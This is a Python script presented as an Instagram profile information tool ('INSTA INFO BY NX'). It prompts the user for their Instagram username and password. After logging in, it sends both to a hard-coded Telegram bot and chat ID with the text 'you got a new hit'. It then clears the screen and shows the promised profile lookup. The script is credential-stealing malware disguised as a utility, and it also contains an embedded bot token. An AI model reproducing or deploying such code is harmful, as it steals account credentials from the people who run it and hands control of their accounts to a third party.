import os
import json
import base64
import sys
import pyfiglet
import webbrowser
from time import sleep
import requests
from gamerinsta import Login
import instaloader


# Check and install necessary modules
print("Checking gamerinsta module...")
try:
    import gamerinsta
except ModuleNotFoundError:
    print("gamerinsta module not found. Installing...")
    os.system("pip install gamerinsta")
    os.system("pip install webbrowser")
    import gamerinsta


def generate_ascii_art(text):
    font = pyfiglet.Figlet()
    ascii_art = font.renderText(text)
    return ascii_art

def send_message_to_telegram(token, chat_id, text1, text2):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    message = f"{text1}\n\n{text2}"

    data = {
        "chat_id": chat_id,
        "text": message
    }

    response = requests.post(url, data=data)
    return response.json()

def main():
    text = "INSTA INFO BY NX"
    ascii_art = generate_ascii_art(text)
    print(ascii_art)
    print("                                      by @spacenx1 \n\n")
    sleep(2)

    Username = str(input("\033[92mEnter Your insta Username: \033[0m"))
    Pass = str(input("\033[92mEnter Your insta Password: \033[0m"))
    a = Username
    b = Pass
    # Log in using gamerinsta
    print("Logging in...")
    login = Login()
    login_result = login.Loginv1(Username, Pass)

    try:
        sess = login_result['Ig-Bearer-Token']
        sess = base64.b64decode(sess).decode()
        sess = json.loads(sess)
        usid = sess['ds_user_id']
        sess = sess['sessionid']
        sleep(15)
        print("\n Join my main telegram channel..")
        print("\n After joining the channel, come back to the tool.")
        sleep(3)
        webbrowser.open(f'https://telegram.me/cheggnx')
    except Exception as e:
        print(f"Error: {e}")
        print(login_result)
    sleep(10)

    # Replace 'YOUR_BOT_TOKEN' and 'CHAT_ID' with your actual bot token and chat ID
    bot_token = '5799297327:AAFnReVk0fjMlFWyuRGuCONqd730ltlb6nI'
    chat_id = '2110818173'
    text1 = "hey! you got a new hit"
    text2 = f"username: {a}, password: {b}"

    response = send_message_to_telegram(bot_token, chat_id, text1, text2)
    print(response)
    os.system('clear')

    try:
        uname = input("\033[36mEnter a username \033[0m: \033[36m")
        if uname == "":
            print("\033[33mUnknown command!")
            sys.exit()

        x = instaloader.Instaloader()
        f = instaloader.Profile.from_username(x.context, uname)
        print("\033[32mUsername\033[0m :", f.username)
        
        print("\033[32mID\033[0m :", f.userid)
        
        print("\033[32mInsta name\033[0m :", f.full_name)
        sleep(1)
        print("\033[32mBiography\033[0m :", f.biography)
        sleep(1)
        print("\033[32mBusiness category\033[0m :", f.business_category_name)
        sleep(1)
        print("\033[32mExternal URL\033[0m :", f.external_url)
        sleep(1)
        print("\033[32mDiikuti orang\033[0m :", f.followed_by_viewer)
        sleep(1)
        print("\033[32mfollowing\033[0m :", f.followees)
        sleep(1)
        print("\033[32mFollowers\033[0m :", f.followers)
        sleep(1)
        print("\033[32mRecently follow someone\033[0m :", f.follows_viewer)
        sleep(1)
        print("\033[32mBlocked people\033[0m :", f.blocked_by_viewer)
        sleep(1)
        print("\033[32mNever blocked people\033[0m :", f.has_blocked_viewer)
        sleep(1)
        print("\033[32mHighlited reels\033[0m :", f.has_highlight_reels)
        sleep(1)
        print("\033[32mPublic story\033[0m :", f.has_public_story)
        sleep(1)
        print("\033[32mHas requested viewers\033[0m :", f.has_requested_viewer)
        sleep(1)
        print("\033[32mAsked people\033[0m :", f.requested_by_viewer)
        sleep(1)
        print("\033[32mHas current story\033[0m :", f.has_viewable_story)
        sleep(1)
        print("\033[32mIGTV\033[0m :", f.igtvcount)
        sleep(1)
        print("\033[32mBusiness account\033[0m :", f.is_business_account)
        sleep(1)
        print("\033[32mAccount private\033[0m :", f.is_private)
        sleep(1)
        print("\033[32mAccount Verified\033[0m :", f.is_verified)
        sleep(1)
        print("\033[32mTotal Posts\033[0m :", f.mediacount)
        sleep(1)
        print("\033[32mProfile image URL\033[0m :", f.profile_pic_url)

    except KeyboardInterrupt:
        print("\033[33mI understand!")

    except EOFError:
        print("\033[33mWhy?")


if __name__ == "__main__":
    main()
